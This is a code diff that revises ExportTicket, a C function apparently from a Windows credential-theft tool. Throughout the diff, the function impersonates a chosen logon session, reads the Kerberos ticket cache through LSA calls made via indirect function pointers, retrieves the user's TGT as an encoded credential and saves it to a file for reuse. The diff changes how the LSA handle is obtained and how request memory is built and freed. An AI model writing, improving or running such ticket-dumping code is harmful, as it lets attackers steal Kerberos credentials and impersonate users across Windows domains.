@@ -1255,9 +1255,9 @@ void ExportTicket(const char* logonIdStr) {
         return;
     }
 
-    HANDLE lsa = NULL;
-    if (con_fn(&lsa) != 0) {
-        PrintError("LsaConnectUntrusted failed");
+    HANDLE lsaHandle = GetLsaHandle(TRUE);
+    if (!lsaHandle) {
+        PrintError("Failed to get LSA handle");
         fre_fn(session_list);
         FreeLibrary(h);
         return;
@@ -1270,9 +1270,8 @@ void ExportTicket(const char* logonIdStr) {
     pkg.MaximumLength = 9;
 
     ULONG auth = 0;
-    if (lkp_fn(lsa, &pkg, &auth) != 0) {
+    if (lkp_fn(lsaHandle, &pkg, &auth) != 0) {
         PrintError("LsaLookupAuthenticationPackage failed");
-        LsaDeregisterLogonProcess(lsa);
         fre_fn(session_list);
         FreeLibrary(h);
         return;
@@ -1296,13 +1295,12 @@ void ExportTicket(const char* logonIdStr) {
     ULONG sz = 0;
     NTSTATUS sub = 0;
 
-    if (cal_fn(lsa, auth, &cacheReq, sizeof(cacheReq), (PVOID*)&cacheRsp, &sz, &sub) != 0 || sub != 0) {
+    if (cal_fn(lsaHandle, auth, &cacheReq, sizeof(cacheReq), (PVOID*)&cacheRsp, &sz, &sub) != 0 || sub != 0) {
         printf("Error: Failed to get ticket cache for LogonId 0x%lx\n", logonId);
         if (needRevert) {
             RevertToSelf();
             CloseHandle(hImpToken);
         }
-        LsaDeregisterLogonProcess(lsa);
         fre_fn(session_list);
         FreeLibrary(h);
         return;
@@ -1310,6 +1308,7 @@ void ExportTicket(const char* logonIdStr) {
 
     BOOL found = FALSE;
     wchar_t targetSrv[512] = { 0 };
+    ULONG ticketFlags = 0;
 
     for (ULONG i = 0; i < cacheRsp->CountOfTickets; i++) {
         KERB_TICKET_CACHE_INFO* t = &cacheRsp->Tickets[i];
@@ -1326,76 +1325,83 @@ void ExportTicket(const char* logonIdStr) {
             found = TRUE;
             wcsncpy(targetSrv, srv, 511);
             targetSrv[511] = L'\0';
+            ticketFlags = t->TicketFlags;
             break;
         }
     }
 
+    fre_fn(cacheRsp);
+
     if (!found) {
         printf("Error: No TGT found for LogonId 0x%lx\n", logonId);
-        fre_fn(cacheRsp);
         if (needRevert) {
             RevertToSelf();
             CloseHandle(hImpToken);
         }
-        LsaDeregisterLogonProcess(lsa);
         fre_fn(session_list);
         FreeLibrary(h);
         return;
     }
 
-    ULONG reqSize = (ULONG)(sizeof(KERB_RETRIEVE_TKT_REQUEST) + (wcslen(targetSrv) * sizeof(WCHAR)));
-    PKERB_RETRIEVE_TKT_REQUEST retReq = (PKERB_RETRIEVE_TKT_REQUEST)malloc(reqSize);
+    size_t targetNameLen = wcslen(targetSrv);
+    LSA_UNICODE_STRING tName;
+    tName.Length = (USHORT)(targetNameLen * sizeof(WCHAR));
+    tName.MaximumLength = tName.Length + sizeof(WCHAR);
+    tName.Buffer = (PWSTR)targetSrv;
 
-    if (!retReq) {
+    size_t structSize = sizeof(MY_KERB_RETRIEVE_TKT_REQUEST);
+    size_t totalSize = structSize + tName.MaximumLength;
+
+    PVOID unmanagedAddr = LocalAlloc(LPTR, totalSize);
+    if (!unmanagedAddr) {
         PrintError("Memory allocation failed");
-        fre_fn(cacheRsp);
         if (needRevert) {
             RevertToSelf();
             CloseHandle(hImpToken);
         }
-        LsaDeregisterLogonProcess(lsa);
         fre_fn(session_list);
         FreeLibrary(h);
         return;
     }
 
-    ZeroMemory(retReq, reqSize);
-    retReq->MessageType = KerbRetrieveEncodedTicketMessage;
-    retReq->LogonId.LowPart = 0;
-    retReq->LogonId.HighPart = 0;
-    retReq->TicketFlags = 0;
-    retReq->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
-    retReq->EncryptionType = 0;
-    retReq->TargetName.Length = (USHORT)(wcslen(targetSrv) * sizeof(WCHAR));
-    retReq->TargetName.MaximumLength = retReq->TargetName.Length;
-    retReq->TargetName.Buffer = (PWSTR)((PBYTE)retReq + sizeof(KERB_RETRIEVE_TKT_REQUEST));
-    memcpy(retReq->TargetName.Buffer, targetSrv, retReq->TargetName.Length);
+    MY_KERB_RETRIEVE_TKT_REQUEST* pRequest = (MY_KERB_RETRIEVE_TKT_REQUEST*)unmanagedAddr;
+    pRequest->MessageType = MY_KerbRetrieveEncodedTicketMessage;
+    pRequest->LogonId.LowPart = 0;
+    pRequest->LogonId.HighPart = 0;
+    pRequest->TargetName = tName;
+    pRequest->TicketFlags = ticketFlags;
+    pRequest->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
+    pRequest->EncryptionType = 0;
+    pRequest->CredentialsHandle.LowPart = NULL;
+    pRequest->CredentialsHandle.HighPart = NULL;
 
-    PKERB_RETRIEVE_TKT_RESPONSE retRsp = NULL;
-    ULONG retSz = 0;
-    sub = 0;
+    PVOID newTargetNameBuffPtr = (PVOID)((BYTE*)unmanagedAddr + structSize);
+    memcpy(newTargetNameBuffPtr, tName.Buffer, tName.MaximumLength);
+    pRequest->TargetName.Buffer = (PWSTR)newTargetNameBuffPtr;
 
-    if (cal_fn(lsa, auth, retReq, reqSize, (PVOID*)&retRsp, &retSz, &sub) != 0 || sub != 0) {
-        printf("Error: Failed to retrieve ticket - Status=0x%08lX, SubStatus=0x%08lX\n",
-            (unsigned long)0, (unsigned long)sub);
-        free(retReq);
-        fre_fn(cacheRsp);
-        if (needRevert) {
-            RevertToSelf();
-            CloseHandle(hImpToken);
-        }
-        LsaDeregisterLogonProcess(lsa);
-        fre_fn(session_list);
-        FreeLibrary(h);
-        return;
-    }
+    PVOID responsePtr = NULL;
+    ULONG responseSize = 0;
+    NTSTATUS protocolStatus = 0;
 
-    free(retReq);
+    NTSTATUS status = cal_fn(lsaHandle, auth, unmanagedAddr, (ULONG)totalSize, &responsePtr, &responseSize, &protocolStatus);
+
+    LocalFree(unmanagedAddr);
 
     if (needRevert) {
         RevertToSelf();
         CloseHandle(hImpToken);
     }
+
+    if (status != 0 || protocolStatus != 0 || !responsePtr || responseSize == 0) {
+        printf("Error: Failed to retrieve ticket - Status=0x%08lX, SubStatus=0x%08lX\n",
+            (unsigned long)status, (unsigned long)protocolStatus);
+        if (responsePtr) fre_fn(responsePtr);
+        fre_fn(session_list);
+        FreeLibrary(h);
+        return;
+    }
+
+    MY_KERB_RETRIEVE_TKT_RESPONSE* pResponse = (MY_KERB_RETRIEVE_TKT_RESPONSE*)responsePtr;
 
     char filename[1024];
     wchar_t cleanUserName[256] = { 0 };
@@ -1421,15 +1427,13 @@ void ExportTicket(const char* logonIdStr) {
     FILE* fp = fopen(filename, "wb");
     if (!fp) {
         printf("Error: Cannot create file %s\n", filename);
-        fre_fn(retRsp);
-        fre_fn(cacheRsp);
-        LsaDeregisterLogonProcess(lsa);
+        fre_fn(responsePtr);
         fre_fn(session_list);
         FreeLibrary(h);
         return;
     }
 
-    fwrite(retRsp->Ticket.EncodedTicket, 1, retRsp->Ticket.EncodedTicketSize, fp);
+    fwrite(pResponse->Ticket.EncodedTicket, 1, pResponse->Ticket.EncodedTicketSize, fp);
     fclose(fp);
 
     printf("\n");
@@ -1438,11 +1442,9 @@ void ExportTicket(const char* logonIdStr) {
     wprintf(L"    User: %ls\\%ls\n", domain, userName);
     wprintf(L"    Server: %ls\n", targetSrv);
     printf("    File: %s\n", filename);
-    printf("    Size: %lu bytes\n", (unsigned long)retRsp->Ticket.EncodedTicketSize);
+    printf("    Size: %lu bytes\n", (unsigned long)pResponse->Ticket.EncodedTicketSize);
 
-    fre_fn(retRsp);
-    fre_fn(cacheRsp);
-    LsaDeregisterLogonProcess(lsa);
+    fre_fn(responsePtr);
     fre_fn(session_list);
     FreeLibrary(h);
 }
